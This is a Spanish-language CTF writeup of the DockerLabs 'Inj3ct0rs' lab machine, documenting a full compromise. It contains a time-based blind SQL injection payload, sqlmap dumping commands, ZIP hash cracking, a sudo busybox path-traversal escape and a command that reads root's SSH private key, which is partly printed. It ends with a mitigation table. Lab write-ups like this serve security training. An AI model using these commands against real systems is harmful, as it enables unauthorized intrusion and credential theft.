# 🛡️ CTF Writeup — Inj3ct0rs
 
> **Plataforma:** DockerLabs · **Dificultad:** Media · **OS:** Linux (Ubuntu)  
> **Categorías:** SQL Injection · ZIP Cracking · Sudo Abuse · SSH · Privilege Escalation
 
---
 
## 📋 Tabla de Contenidos
 
1. [Resumen Ejecutivo](#-resumen-ejecutivo)
2. [Despliegue del Entorno](#-despliegue-del-entorno)
3. [Reconocimiento](#-reconocimiento)
4. [Acceso Inicial — SQL Injection](#-acceso-inicial--sql-injection)
5. [Análisis de Directorios y ZIP Cracking](#-análisis-de-directorios-y-zip-cracking)
6. [Intrusión SSH y Movimiento Lateral](#-intrusión-ssh-y-movimiento-lateral)
7. [Escalada de Privilegios a Root](#-escalada-de-privilegios-a-root)
8. [Flags](#-flags)
9. [Lecciones Aprendidas](#-lecciones-aprendidas)
---
 
## 📌 Resumen Ejecutivo
 
| Campo | Detalle |
|---|---|
| **Nombre** | Inj3ct0rs |
| **IP Objetivo** | `172.22.0.2` |
| **Servicios expuestos** | SSH (22), HTTP (80) |
| **Vector inicial** | SQL Injection (Time-Based Blind) |
| **Escalada** | Sudo wildcard abuse → `cat` NOPASSWD → SSH privkey |
| **Resultado** | ✅ Root comprometido |
 
---
 
## 🚀 Despliegue del Entorno
 
La máquina se despliega localmente mediante Docker usando el script automatizado incluido en el paquete:
 
```bash
unzip inj3ct0rs.zip
bash auto_run.sh inj3ct0rss.tar
```
 
> **Nota:** Al terminar la auditoría, `Ctrl+C` detiene el script y destruye el contenedor automáticamente, garantizando limpieza completa del entorno.
 
---
 
## 🔍 Reconocimiento
 
### Escaneo de Puertos con Nmap
 
Se realizaron dos fases: descubrimiento rápido de puertos y enumeración de servicios/versiones.
 
```bash
# Fase 1 — Descubrimiento de puertos abiertos
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.22.0.2
 
# Fase 2 — Enumeración de servicios y scripts por defecto
nmap -sCV -p22,80 172.22.0.2
```
 
### Resultados
 
| Puerto | Servicio | Versión |
|---|---|---|
| `22/TCP` | SSH | OpenSSH 9.6p1 Ubuntu (3ubuntu13.4) |
| `80/TCP` | HTTP | Apache httpd 2.4.58 (Ubuntu) |
 
**Observaciones:**
- El sitio en el puerto 80 presenta el título *"Inj3ct0rs CTF - Página Principal"*.
- Se identificaron formularios de **Login** y **Registro** con backend MySQL.
---
 
## 💉 Acceso Inicial — SQL Injection
 
### Interceptación de la Petición
 
Utilizando **Burp Suite**, se interceptó la petición POST del formulario de login en `/content_pages_hidden/db.php` y se exportó a `request.txt`:
 
```http
POST /content_pages_hidden/db.php HTTP/1.1
Host: 172.22.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Type: application/x-www-form-urlencoded
Connection: close
Referer: http://172.22.0.2/login.php
 
username=admin&password=admin
```
 
### Explotación con SQLMap
 
El parámetro `password` resultó vulnerable a **Time-Based Blind SQL Injection**, confirmado con el payload:
 
```sql
admin' AND (SELECT 1525 FROM (SELECT(SLEEP(5)))JwlH) AND 'NaxG'='NaxG
```
 
**Pipeline completo de extracción:**
 
```bash
# 1. Enumerar bases de datos disponibles
sqlmap -r request.txt --dbs
 
# 2. Listar tablas de la base de datos objetivo
sqlmap -r request.txt -D injectors_db --tables
 
# 3. Enumerar columnas de la tabla de usuarios
sqlmap -r request.txt -D injectors_db -T users --columns
 
# 4. Volcar credenciales
sqlmap -r request.txt -D injectors_db -T users -C id,username,password --dump
```
 
### Credenciales Extraídas
 
| ID | Usuario | Contraseña |
|---|---|---|
| 1 | `root` | `loveyou` |
| 2 | `jane` | `chicago123` |
| 3 | `admin` | `password` |
| 4 | `ralf` | `no_mirar_en_este_directorio` ⚠️ |
 
> **Hallazgo clave:** La contraseña del usuario `ralf` sugiere la existencia de una ruta web oculta.
 
---
 
## 🔐 Análisis de Directorios y ZIP Cracking
 
### Descubrimiento del Directorio Oculto
 
La contraseña `no_mirar_en_este_directorio` funcionó como pista directa hacia la ruta:
 
```
http://172.22.0.2/no_mirar_en_este_directorio/
```
 
En esa ruta se encontró el archivo `secret.zip`, protegido con contraseña.
 
### Cracking del Archivo ZIP
 
```bash
# Extraer hash del ZIP
zip2john secret.zip > hash
 
# Ataque de fuerza bruta con rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
 
**Contraseña descubierta:** `computer`
 
### Contenido del Archivo
 
```bash
unzip secret.zip
cat confidencial.txt
```
 
```
You have to change your password ralf, I have told you many times...
Your new credentials are: ralf:supersecurepassword
```
 
---
 
## 🔑 Intrusión SSH y Movimiento Lateral
 
### Acceso Inicial como `ralf`
 
```bash
ssh ralf@172.22.0.2
# Password: supersecurepassword
```
 
✅ **Flag 1/2 obtenida:** `user.txt` → `382af2fb41eb95b1d6c6358b6c55ffce`
 
---
 
### Pivoteo al Usuario `capa`
 
Enumerando privilegios sudo:
 
```bash
sudo -l
```
 
```
(capa : capa) NOPASSWD: /usr/local/bin/busybox /nothing/*
```
 
**Técnica:** El comodín `*` permite un **Path Traversal** para escapar del directorio `/nothing/`:
 
```bash
sudo -u capa /usr/local/bin/busybox /nothing/../usr/bin/sh
/bin/bash
```
 
> **Por qué funciona:** El shell de `busybox` no valida el path resuelto, permitiendo escapar de la restricción de directorio mediante `../`.
 
---
 
## ⚡ Escalada de Privilegios a Root
 
### Enumeración de Sudo como `capa`
 
```bash
sudo -l
```
 
```
(ALL : ALL) NOPASSWD: /bin/cat
```
 
### Lectura de la Clave Privada SSH de Root
 
Dado que `/bin/cat` puede ejecutarse como cualquier usuario sin contraseña, se extrajo la clave privada del administrador:
 
```bash
sudo /bin/cat /root/.ssh/id_rsa
```
 
<details>
<summary>🔑 Ver clave privada capturada (id_rsa)</summary>
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcnNhAAAAAwEAAQAAAgEAx7wRGZs86cLk6QtiELD9oXmIZMQDclgYbkr+j8aR5iqnVb0HtRPU4ql/Va6It+VmzCARj+6p4NlAM1nXeoGt2Ad9H0CUHCefwN5u50lMS1x+6XXh3p4Ww5dnJFv6O+yVvAfe+CXtos1ckqsdu6qJ2tDRCBye4/q55DV0Mk5ACxKdWw5pzqHpM9H3utQ3/5rMKSfKzDmwdmpJgElWPOwvD1OY0WuL9U0i/5jay/QnUBeUCK1Khyx+sJx86yRyqD63CgklLj4kxsWQlD1EvKHwKf3PgJqve/tUpO4w2KFbm3ThRew4a0AN12gskVXaR1XQnoL1HM70wH6HCUi1JFRklqBTwbzgQCJbm4cZcUWHfpKZauFXZt1uYYOZMYbRFKzsWUO7fOEt63TJMHsMMhOQrlHf4SWEn8DISb3NY2WZd5wpaoHkwTuXibR6pKu8Ygv8ksEY/Lo4/dAAEFbFtfCq9wPZLv8ULyPJ/5SCML3nrO7HWoF3wgrERNM/Zze5JwmC9i4/nL86z9O+W1LvoHY81yo0pne1/M4YK78g5yG2Uw3uVvKFMVeAFC4bc4/mH4LHQ+4CWXerJu5Wax1oFDYgUPnYhiy3ktQkQnzp/e5EMauk/ZMu/wgIvix20+2bfscnqngrZlbmmZl9nkPM8j/gbP+0tyrBFqJx5t6gu1hU7lUAAAdIUtabUFLWm1AAAAAHc3NoLXJzYQAAAgEAx7wRGZs86cLk6QtiELD9oXmIZMQDclgYbkr+j8aR5iqnVb0HtRPU4ql/Va6It+VmzCARj+6p4NlAM1nXeoGt2Ad9H0CUHCefwN5u50lMS1x+6XXh3p4Ww5dnJFv6O+yVvAfe+CXtos1ckqsdu6qJ2tDRCBye4/q55DV0Mk5ACxKdWw5pzqHpM9H3utQ3/5rMKSfKzDmwdmpJgElWPOwvD1OY0WuL9U0i/5jay/QnUBeUCK1Khyx+sJx86yRyqD63CgklLj4kxsWQlD1EvKHwKf3PgJqve/tUpO4w2KFbm3ThRew4a0AN12gskVXaR1XQnoL1HM70wH6HCUi1JFRklqBTwbzgQCJbm4cZcUWHfpKZauFXZt1uYYOZMYbRFKzsWUO7fOEt63TJMHsMMhOQrlHf4SWEn8DISb3NY2WZd5wpaoHkwTuXibR6pKu8Ygv8ksEY/Lo4/dAAEFbFtfCq9wPZLv8ULyPJ/5SCML3nrO7HWoF3wgrERNM/Zze5JwmC9i4/nL86z9O+W1LvoHY81yo0pne1/M4YK78g5yG2Uw3uVvKFMVeAFC4bc4/mH4LHQ+4CWXerJu5Wax1oFDYgUPnYhiy3ktQkQnzp/e5EMauk/ZMu/wgIvix20+2bfscnqngrZlbmmZl9nkPM8j/gbP+0tyrBFqJx5t6gu1hU7lUAAAADAQABAAACAAE7AaD2gZ7QDlB4Ozuul3Vr9gDm6z2EWOwvBpf0qXfx...
-----END OPENSSH PRIVATE KEY-----
```
 
</details>
### Conexión Final como Root
 
```bash
# Guardar y configurar la clave privada
nano id_rsa
chmod 600 id_rsa
 
# Autenticación SSH como root
ssh -i id_rsa root@172.22.0.2
```
 
✅ **Flag 2/2 obtenida:** `/root/true_root.txt` → `8e776bdaed0b6748686b7ce6d38ccca3`
 
---
 
## 🏁 Flags
 
| # | Archivo | Hash | Usuario |
|---|---|---|---|
| 1 | `/home/ralf/user.txt` | `382af2fb41eb95b1d6c6358b6c55ffce` | `ralf` |
| 2 | `/root/true_root.txt` | `8e776bdaed0b6748686b7ce6d38ccca3` | `root` |
 
---
 
## 🧠 Lecciones Aprendidas
 
### Vulnerabilidades Identificadas
 
| Vulnerabilidad | Impacto | Mitigación |
|---|---|---|
| SQL Injection (Time-Based Blind) | Exposición total de la base de datos | Usar consultas parametrizadas / prepared statements |
| Contraseñas en texto plano en DB | Credenciales directamente usables | Hashear con bcrypt/argon2 + sal |
| Contraseña como pista de ruta oculta | Enumeración de directorios | No usar datos sensibles como nombres de rutas |
| ZIP sin cifrado robusto | Fuerza bruta exitosa | Usar contraseñas largas y aleatorias |
| Sudo wildcard (`*`) en path | Escape de restricción de directorio | Especificar paths absolutos sin comodines |
| `cat` con NOPASSWD como root | Lectura arbitraria de archivos | Evitar dar privilegios de lectura global con sudo |
| Clave privada SSH de root accesible | Compromiso total del sistema | Restringir permisos de `/root/.ssh/` |
 
### Cadena de Ataque (Attack Chain)
 
```
Reconocimiento (nmap)
        │
        ▼
   SQL Injection
   (sqlmap / Time-Based Blind)
        │
        ▼
  Credenciales DB → Directorio oculto
        │
        ▼
   ZIP Cracking (john + rockyou)
        │
        ▼
  SSH como ralf
        │
        ▼
  Sudo Wildcard Path Traversal → capa
        │
        ▼
  sudo cat /root/.ssh/id_rsa → root
        │
        ▼
      🏆 PWNED
```
 
---
 
## 🛠️ Herramientas Utilizadas
 
| Herramienta | Propósito |
|---|---|
| `nmap` | Reconocimiento y enumeración de servicios |
| `Burp Suite` | Interceptación y análisis de peticiones HTTP |
| `sqlmap` | Explotación automatizada de SQL Injection |
| `zip2john` + `john` | Cracking de archivos ZIP protegidos |
| `busybox` | Pivoteo de usuario mediante sudo abuse |
| `ssh` | Acceso remoto y autenticación con clave privada |
 
---
 
> ⚠️ **Disclaimer:** Este writeup documenta una auditoría realizada en un entorno de laboratorio controlado con fines educativos (CTF). Toda la información aquí presentada se aplica exclusivamente a sistemas propios o autorizados.
